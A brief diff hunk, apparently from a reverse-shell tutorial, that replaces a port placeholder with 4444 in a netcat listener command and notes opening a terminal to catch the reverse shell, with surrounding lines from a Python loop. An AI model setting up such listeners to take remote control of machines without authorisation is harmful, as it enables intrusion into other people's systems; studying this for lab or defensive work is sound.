@@ -274,7 +274,7 @@ while True:
             sys.exit()
 
 open a terminal and run NetCat listen for the reverse shell. 
-# nc -nvlp <port#> 
+# nc -nvlp 4444 
 listening on [any] 4444 …
 
 Windows 10:
